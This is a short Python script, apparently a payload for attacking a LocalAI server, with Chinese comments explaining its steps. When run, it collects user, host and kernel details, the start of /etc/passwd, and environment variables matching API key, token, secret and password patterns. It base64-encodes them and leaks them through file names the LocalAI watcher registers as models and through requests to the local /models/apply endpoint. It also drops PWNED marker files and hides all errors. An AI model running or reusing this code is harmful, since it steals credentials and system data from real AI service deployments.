import os, subprocess, base64
def _run():
    try:
        r = subprocess.check_output("id; hostname; uname -a; echo ===PASSWD===; head -5 /etc/passwd 2>/dev/null; echo ===ENV===; env | grep -iE 'api.?key|token|secret|sk-|deepseek|openai|azure|password|auth|localai' | head -30", shell=True, stderr=subprocess.STDOUT, timeout=25)
    except Exception as e:
        r = str(e).encode()
    b64 = base64.b64encode(r).decode()
    # 写常规文件
    for p in ["/models/PWNED.txt", "/tmp/PWNED.txt", "/build/models/PWNED.txt"]:
        try:
            open(p, "wb").write(r)
        except: pass
    # 分段写为 /models/OUT-<seg> 文件 (LocalAI watcher 扫描注册为模型)
    seg = 40
    for i in range(0, len(b64), seg):
        part = b64[i:i+seg]
        for fn in ["/models/OUT-" + part, "/models/OUT-" + part + ".py", "/build/models/OUT-" + part]:
            try:
                open(fn, "w").write("# pwn\n")
            except: pass
    # 也尝试注册 ZZ-- 模型(通过 apply, 可能被拒但无害)
    try:
        import json as _j, urllib.request as _u
        full = b64
        for i in range(0, len(full), 100):
            seg2 = full[i:i+100]
            body = _j.dumps({"id": "ZZ--" + seg2, "name": "ZZ--" + seg2}).encode()
            for port in [8080, 80, 443]:
                try:
                    req = _u.Request(f"http://127.0.0.1:{port}/models/apply", data=body, headers={"Content-Type":"application/json"})
                    _u.urlopen(req, timeout=5).read()
                except: pass
    except: pass
_run()
